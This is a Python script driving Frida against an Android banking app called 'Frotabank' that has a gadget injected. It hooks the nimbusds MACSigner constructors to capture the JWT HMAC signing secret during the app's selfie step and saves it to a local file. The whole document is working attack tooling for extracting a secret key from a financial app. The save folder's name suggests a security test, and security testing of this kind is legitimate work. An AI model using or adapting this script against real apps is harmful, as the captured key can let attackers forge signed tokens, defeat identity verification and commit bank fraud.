#!/usr/bin/env python3
"""Connect to Frotabank (with frida-gadget injected) and hook the signing key."""
import frida, sys, time

SCRIPT = r"""
'use strict';

function tryHook() {
    if (typeof Java === 'undefined') {
        console.log("[!] Java is still undefined even with gadget!");
        return false;
    }
    if (!Java.available) {
        console.log("[!] Java defined but not available");
        return false;
    }

    Java.perform(function() {
        console.log("[+] JAVA BRIDGE WORKS WITH GADGET!");

        // Hook MACSigner(String)
        try {
            var MACSigner = Java.use("com.nimbusds.jose.crypto.MACSigner");
            MACSigner.$init.overload("java.lang.String").implementation = function(secret) {
                console.log("============================================================");
                console.log("[!!!] ORIGINAL APK SIGNING KEY:");
                console.log("[KEY] " + secret);
                console.log("[LEN] " + secret.length);
                console.log("============================================================");
                send({type: "key", key: secret});
                return this.$init(secret);
            };
            console.log("[+] Hooked MACSigner(String)");
        } catch(e) {
            console.log("[-] MACSigner hook: " + e);
        }

        // Hook MACSigner(byte[])
        try {
            var MACSigner = Java.use("com.nimbusds.jose.crypto.MACSigner");
            MACSigner.$init.overload("[B").implementation = function(secret) {
                var hex = "";
                for (var i = 0; i < secret.length; i++) hex += (secret[i] & 0xFF).toString(16).padStart(2, "0");
                console.log("[KEY_BYTES] " + hex);
                send({type: "key_bytes", key: hex});
                return this.$init(secret);
            };
            console.log("[+] Hooked MACSigner(byte[])");
        } catch(e) {
            console.log("[-] MACSigner(byte[]): " + e);
        }

        console.log("[*] Hooks ready. Navigate to selfie to capture the key.");
    });
    return true;
}

// Retry loop
var attempts = 0;
function attempt() {
    attempts++;
    console.log("[*] Attempt " + attempts + " to hook Java...");
    if (tryHook()) {
        console.log("[+] Hooking successful!");
    } else if (attempts < 10) {
        setTimeout(attempt, 2000);
    } else {
        console.log("[FAIL] Java bridge not available after " + attempts + " attempts");
    }
}

setTimeout(attempt, 3000);
"""

found_key = None

def on_message(msg, data):
    global found_key
    if msg["type"] == "send" and isinstance(msg.get("payload"), dict):
        if "key" in msg["payload"]:
            found_key = msg["payload"]["key"]
            print(f"\n{'='*60}", flush=True)
            print(f"ORIGINAL KEY: {found_key}", flush=True)
            print(f"{'='*60}\n", flush=True)
            with open(r"C:\Users\Acer\Documents\Frota\TESTE_SEGURANCA\original_signing_key.txt", "w") as f:
                f.write(found_key)
    print(f"[msg] {msg}", flush=True)

print("[*] Connecting to USB device...", flush=True)
device = frida.get_usb_device(timeout=10)
print(f"[*] Device: {device.name}", flush=True)

print("[*] Attaching to PID 11672 (Frotabank with gadget)...", flush=True)
try:
    session = device.attach(11672)
    print("[*] Attached! Loading script...", flush=True)
    script = session.create_script(SCRIPT)
    script.on("message", on_message)
    script.load()
    print("[*] Script loaded. Waiting up to 120s...", flush=True)

    for i in range(120):
        time.sleep(1)
        if found_key:
            break
        if i % 15 == 0 and i > 0:
            print(f"  [{i}s] Waiting for selfie...", flush=True)

    session.detach()
except Exception as e:
    print(f"[ERROR] {e}", flush=True)

if found_key:
    print(f"\nSUCCESS: Original APK key = {found_key}", flush=True)
else:
    print("\nKey not captured. Either Java bridge failed or selfie wasn't triggered.", flush=True)
